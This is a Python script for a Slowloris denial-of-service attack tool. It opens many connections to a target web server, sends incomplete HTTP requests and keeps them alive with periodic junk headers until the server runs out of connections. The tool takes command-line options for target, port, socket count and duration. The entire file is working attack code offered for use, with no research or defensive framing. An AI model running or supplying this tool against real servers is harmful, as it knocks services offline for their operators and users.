#!/usr/bin/env python3

"""
Slowloris Attack Script
- Opens multiple connections to the target server and keeps them open as long as possible
- Exhausts the connection pool of the server by sending partial HTTP requests
- Compatible with Python 3.10
"""

import socket
import random
import time
import argparse
import threading
from datetime import datetime

# Global variables
list_of_sockets = []
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
]

stop_event = None

def init_socket(ip, port):
    """
    Initialize a socket connection to the target
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    
    try:
        s.connect((ip, port))
        
        # Send a partial HTTP request (never complete it)
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        
        return s
    except socket.error:
        return None

def slowloris_attack(target_ip, target_port=80, num_sockets=100, duration=60):
    """
    Execute a Slowloris attack against the target
    
    :param target_ip: Target IP address
    :param target_port: Target port (default: 80)
    :param num_sockets: Number of sockets to use (default: 100)
    :param duration: Attack duration in seconds (default: 60)
    """
    global list_of_sockets, stop_event
    
    print(f"[*] Starting Slowloris attack against {target_ip}:{target_port}")
    print(f"[*] Creating {num_sockets} sockets...")
    print(f"[*] Attack will run for {duration} seconds")
    print(f"[*] Started at: {datetime.now().strftime('%H:%M:%S')}")
    
    stop_event = threading.Event()
    start_time = time.time()
    socket_count = 0
    
    # Create sockets
    for _ in range(num_sockets):
        try:
            s = init_socket(target_ip, target_port)
            if s:
                list_of_sockets.append(s)
                socket_count += 1
                if socket_count % 50 == 0:
                    print(f"[*] Created {socket_count} sockets")
        except:
            pass
    
    print(f"[*] Created {len(list_of_sockets)} sockets successfully")
    
    # Main loop
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            # Send headers periodically to keep connections alive
            print(f"[*] Sending keep-alive headers... Socket count: {len(list_of_sockets)}")
            
            # Go through the sockets and check if they're still alive
            for s in list(list_of_sockets):
                try:
                    # Send incomplete HTTP header to keep connection open
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except:
                    # Socket is dead, remove it and create a new one
                    list_of_sockets.remove(s)
                    try:
                        new_socket = init_socket(target_ip, target_port)
                        if new_socket:
                            list_of_sockets.append(new_socket)
                    except:
                        pass
            
            # Show status
            elapsed = time.time() - start_time
            print(f"[*] Time elapsed: {elapsed:.2f} seconds | Sockets active: {len(list_of_sockets)}")
            
            # Sleep between cycles (10 seconds)
            time.sleep(10)
            
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    finally:
        # Clean up
        stop_event.set()
        print("[*] Closing all sockets...")
        for s in list_of_sockets:
            try:
                s.close()
            except:
                pass
        
        print("[*] Attack finished")
        total_time = time.time() - start_time
        print(f"[*] Total time: {total_time:.2f} seconds")
        print(f"[*] Maximum socket count: {socket_count}")

if __name__ == "__main__":
    # Setup argument parser
    parser = argparse.ArgumentParser(description='Slowloris Attack Tool')
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-s', '--sockets', type=int, default=100, help='Number of sockets (default: 100)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds (default: 60)')
    
    args = parser.parse_args()
    
    # Execute attack
    slowloris_attack(args.target, args.port, args.sockets, args.duration)
